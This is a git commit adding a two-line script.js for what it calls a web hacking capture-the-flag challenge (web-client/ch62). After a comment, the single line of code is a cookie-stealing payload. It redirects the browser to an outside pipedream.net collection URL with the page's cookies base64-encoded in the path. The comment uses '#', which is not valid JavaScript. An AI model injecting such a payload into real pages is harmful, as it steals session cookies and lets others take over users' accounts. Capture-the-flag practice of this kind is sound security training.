46c649430a2109ece8dcb610e2baefaa2692e4a5
Neco-Arc-gif <melvyn.saksik@gmail.com>
2025-01-29 19:17:37 +0100

    Create script.js for CTF

---
+++ web-client/ch62/script.js
@@ -0,0 +1,2 @@
+# Note: This is for a web hacking challenge, please don't try to interact with anything beside the website
+window.location="https://eotoci65n24zl7e.m.pipedream.net/"+btoa(document.cookie); 
